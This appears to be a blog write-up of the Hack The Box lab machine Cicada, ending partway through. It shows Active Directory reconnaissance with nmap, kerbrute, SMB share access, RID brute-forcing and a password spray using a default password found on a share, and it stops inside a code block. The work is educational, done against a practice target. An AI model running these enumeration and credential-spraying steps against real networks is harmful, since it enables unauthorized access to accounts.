@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Cicada&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Cicada">
+  
+    <meta name="description" content="Cicada is a nice easy box for practicing Windows enumeration and attacks. Foothold involves using netexec, ldapdomaindump and Impacket scripts to retrieve multiple sets of credentials from SMB and LDAP, and eventually getting a shell with WinRM. Once on the box, I’ll abuse the Backup Operators group membership to retrieve ntds.dit and extract the admin hash for an elevated shell.">
+    <meta property="og:description" content="Cicada is a nice easy box for practicing Windows enumeration and attacks. Foothold involves using netexec, ldapdomaindump and Impacket scripts to retrieve multiple sets of credentials from SMB and LDAP, and eventually getting a shell with WinRM. Once on the box, I’ll abuse the Backup Operators group membership to retrieve ntds.dit and extract the admin hash for an elevated shell.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/79616a32a057e5e672dadb51bb96dd04.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/79616a32a057e5e672dadb51bb96dd04.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Cicada</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Feb 16, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/1990b98a88f780c5892fe02431bf0770" class="PageRoot"><h3 id="https://www.notion.so/1990b98a88f780ffbc10e4708b625d7a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1990b98a88f780ffbc10e4708b625d7a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1990b98a88f7801fbb27fe0d7c5f9503" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Cicada is a nice easy box for practicing Windows enumeration and attacks. Foothold involves using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netexec</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ldapdomaindump</code></span><span class="SemanticString"> and Impacket scripts to retrieve multiple sets of credentials from SMB and LDAP, and eventually getting a shell with WinRM. Once on the box, I’ll abuse the Backup Operators group membership to retrieve </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString"> and extract the admin hash for an elevated shell.</span></span></p></div><div id="https://www.notion.so/1990b98a88f780f39d0df21aea2a09d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7804b8955f8d719cd523f" class="Divider"></div><h3 id="https://www.notion.so/1990b98a88f78014b635d9e302c21407" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1990b98a88f78014b635d9e302c21407"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/1990b98a88f7803e8a6ee8103bed7b7e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/1990b98a88f780629c03e6d342887c9a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.198.55 -oA tcp_all_ports/results     
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 01:22 ACST
+Nmap scan report for 10.129.198.55
+Host is up (0.33s latency).
+Not shown: 65525 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 199.19 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 53,88,135,139,389,445,636,3268,3269,5985 10.129.198.55 -oA aggressive/tcp
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 01:31 ACST
+Nmap scan report for 10.129.198.55
+Host is up (0.33s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 23:01:56Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+445/tcp  open  microsoft-ds?
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022 (88%)
+Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-10-01T23:02:49
+|_  start_date: N/A
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   333.95 ms 10.10.14.1
+2   332.37 ms 10.129.198.55
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.15 seconds</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7800b96dbfc90b2814dac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is a pure domain controller with no web servers found. Common Windows services such as SMB, LDAP and Kerberos are all present.</span></span></p></div><div id="https://www.notion.so/1990b98a88f78098b3f6c49457aaa063" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f780068353fdf32b4698d0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP88 — Kerberos:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f780acac66d8df7e821819" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With Kerberos open, I’ll always run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">kerbrute</code></span><span class="SemanticString"> in the background to enumerate usernames.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780c3b232f4a5273e11a9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> kerbrute userenum -d cicada.htb --dc 10.129.198.55 -t 100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/02/24 - Ronnie Flathers @ropnop
+
+2024/10/02 01:38:23 &gt;  Using KDC(s):
+2024/10/02 01:38:23 &gt;  	10.129.198.55:88
+
+2024/10/02 01:38:25 &gt;  [+] VALID USERNAME:	 guest@cicada.htb
+2024/10/02 01:38:30 &gt;  [+] VALID USERNAME:	 administrator@cicada.htb
+2024/10/02 01:39:09 &gt;  [+] VALID USERNAME:	 Guest@cicada.htb
+2024/10/02 01:39:09 &gt;  [+] VALID USERNAME:	 Administrator@cicada.htb
+2024/10/02 01:41:59 &gt;  [+] VALID USERNAME:	 GUEST@cicada.htb
+2024/10/02 09:45:14 &gt;  Done! Tested 8295455 usernames (5 valid) in 29211.260 seconds</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7802082e0eb01d43c2658" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Unfortunately in this case, no real users were found. However, it should be noted that the Guest account seems to be enabled.</span></span></p></div><div id="https://www.notion.so/1990b98a88f7802e9047e74aec6f62db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f780f2a03fe9db5705ef4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP445 — SMB:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f7808fa99af44c005bff31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Anonymous access is enabled. Looks like there’s two custom shares: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Dev</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HR</code></span><span class="SemanticString">, which is readable.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780d88ff6c638c8f24cfd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> netexec smb 10.129.198.55 -u &#x27;Anonymous&#x27; -p &#x27;&#x27; --shares
+
+SMB         10.129.198.55   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.198.55   445    CICADA-DC        [+] cicada.htb\Anonymous: 
+SMB         10.129.198.55   445    CICADA-DC        [+] Enumerated shares
+SMB         10.129.198.55   445    CICADA-DC        Share           Permissions     Remark
+SMB         10.129.198.55   445    CICADA-DC        -----           -----------     ------
+SMB         10.129.198.55   445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.129.198.55   445    CICADA-DC        C$                              Default share
+SMB         10.129.198.55   445    CICADA-DC        DEV                             
+SMB         10.129.198.55   445    CICADA-DC        HR              READ            
+SMB         10.129.198.55   445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.129.198.55   445    CICADA-DC        NETLOGON                        Logon server share 
+SMB         10.129.198.55   445    CICADA-DC        SYSVOL                          Logon server share</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f78007a7ddccc62116fd68" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll connect to the share with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">smbclient</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780b8be3cf6818ca7625f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;Anonymous&#x27; -N \\\\10.129.198.55\\HR
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+  .                                   D        0  Thu Mar 14 22:59:09 2024
+  ..                                  D        0  Thu Mar 14 22:51:29 2024
+  Notice from HR.txt                  A     1266  Thu Aug 29 03:01:48 2024
+
+		4168447 blocks of size 4096. 337353 blocks available
+		
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> get &quot;Notice from HR.txt&quot;
+
+getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7806ab550e2800851aa57" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The share has a single text file, which contains a password.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f7808cb2eff8bc1e967099" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Dear new hire!
+
+Welcome to Cicada Corp! We&#x27;re thrilled to have you join our team. As part of our security protocols, it&#x27;s essential that you change your default password to something unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+To change your password:
+
+1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
+2. Once logged in, navigate to your account settings or profile settings section.
+3. Look for the option to change your password. This will be labeled as &quot;Change Password&quot;.
+4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
+5. After changing your password, make sure to save your changes.
+
+Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
+
+If you encounter any issues or need assistance with changing your password, don&#x27;t hesitate to reach out to our support team at support@cicada.htb.
+
+Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
+
+Best regards,
+Cicada Corp</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7801aac28deee1d904c92" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Unless I have a list of valid usernames, the password alone isn’t quite useful.</span></span></p></div><div id="https://www.notion.so/1990b98a88f780f68525e3a37f4fb9a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f780828c3bfeeb97f4651a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">RPC User Enumeration:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f78040bf8ef476ce6da445" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given I also have read access to the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">IPC$</code></span><span class="SemanticString"> share, I can get a list of usernames by brute-forcing RIDs, as described in this </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970">blog post</a></span><span class="SemanticString">. Valid credentials are needed normally, but I can use the enabled guest account here.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780da8230f0522edb3f4b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> netexec smb 10.129.198.55 -u &#x27;guest&#x27; -p &#x27;&#x27; --rid-brute
+
+SMB         10.129.198.55   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.198.55   445    CICADA-DC        [+] cicada.htb\guest: 
+SMB         10.129.198.55   445    CICADA-DC        [+] Brute forcing RIDs
+SMB         10.129.198.55   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+SMB         10.129.198.55   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.198.55   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.198.55   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.198.55   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+SMB         10.129.198.55   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB         10.129.198.55   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+SMB         10.129.198.55   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780eea1f6e4cba95f880b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I used </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netexec</code></span><span class="SemanticString"> here, but it could also be done by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-lookupsid</code></span><span class="SemanticString">, as shown in my </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/flight">Flight writeup</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1990b98a88f78051ab0fdbe5c3e09038" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the user list, I did a password spray and found it works for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael.wrightson</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78086b89be9cbe1bdbe28" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> netexec smb 10.129.198.55 -u users.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; --continue-on-success
+
+SMB         10.129.198.55   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.198.55   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.198.55   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.198.55   445    CICADA-DC        </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 </span></mark></span><span class="SemanticString"><span>
+SMB         10.129.198.55   445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.198.55   445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780adaaf9dc45b3b0ed6f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the user doesn’t have any extra access in SMB.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780269b12c00b470ab558" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
